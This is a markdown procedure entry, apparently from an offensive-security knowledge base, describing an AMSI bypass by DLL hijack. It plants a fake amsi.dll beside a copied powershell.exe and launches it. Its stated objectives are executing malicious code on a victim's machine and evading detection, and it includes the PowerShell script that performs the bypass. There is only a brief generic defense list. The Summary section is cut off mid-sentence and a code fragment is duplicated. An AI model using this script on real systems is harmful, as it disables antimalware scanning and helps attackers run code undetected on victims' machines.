---
id: 682bba3a-8aea-4a1d-95d8-d66387cedaaf
name: Reflection and DLL Hijack PowerShell Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:26.070078+00:00'
updated_at: '2023-04-10T20:36:16.918584+00:00'
tags:
- '[[Using Cornelis de Plaas DLL hijack method]]'
- '[[Using Matt Graebers Reflection method with WMF5 autologging bypass]]'
commands:
- '[[Bypass AMSI]]'
---

# Reflection and DLL Hijack PowerShell Execution

## Summary

Reflection and DLL hijack PowerShell execution is a technique used by attackers to bypass security measures that detect and prevent malicious PowerShell activity. This technique involves using a legitimate process to execute a PowerShell script. The script is loaded into memory using Matt Graeber's

## Description

# Description

Reflection and DLL hijack PowerShell execution is a technique used by attackers to bypass security measures that detect and prevent malicious PowerShell activity. This technique involves using a legitimate process to execute a PowerShell script. The script is loaded into memory using Matt Graeber's Reflection method, which allows the attacker to bypass anti-malware scan interfaces (AMSI) and Windows Management Framework (WMF) 5 autologging bypass. Additionally, Cornelis de Plaas DLL hijack method is used to execute the script. This method allows the attacker to load a malicious DLL instead of a legitimate one, which can be used to execute the script. This technique can be used to evade detection and execute malicious code on a victim's machine.

 

## Requirements

1. Access to a victim's machine.

1. The ability to execute PowerShell scripts on the victim's machine.

 

## Defense

1. Implement application whitelisting to prevent unauthorized applications and scripts from running.

1. Monitor for suspicious PowerShell activity, including the use of reflection and DLL hijacking.

1. Regularly update and patch software to prevent vulnerabilities that can be exploited by attackers.

 

## Objectives

1. Execute malicious PowerShell code on a victim's machine.

1. Bypass security measures that detect and prevent malicious PowerShell activity.

1. Evade detection and remain undetected on the victim's machine.

 

# Instructions

1. The Bypass AMSI and Execute PowerShell command is used to bypass the Anti-Malware Scan Interface (AMSI) and execute PowerShell commands on a system. The command does this by first dropping a fake amsi.dll file to disk and then copying the powershell.exe executable to the current working directory. Finally, it starts PowerShell from the current working directory.

 



**Code**: [[[Byte[]] $temp = $DllBytes -split ' '
Write-Output]]



> The command takes no arguments.



**Command** ([[Bypass AMSI]]):

```powershell
[Byte[]] $temp = $DllBytes -split ' '
Write-Output "Executing the bypass."
Write-Verbose "Dropping the fake amsi.dll to disk."
[System.IO.File]::WriteAllBytes("$pwd\amsi.dll", $temp)

Write-Verbose "Copying powershell.exe to the current working directory."
Copy-Item -Path C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Destination $pwd

Write-Verbose "Starting powershell.exe from the current working directory."
& "$pwd\powershell.exe"
```



## Commands Used

- [[Bypass AMSI]]

## Tags

- [[Using Cornelis de Plaas DLL hijack method]]
- [[Using Matt Graebers Reflection method with WMF5 autologging bypass]]


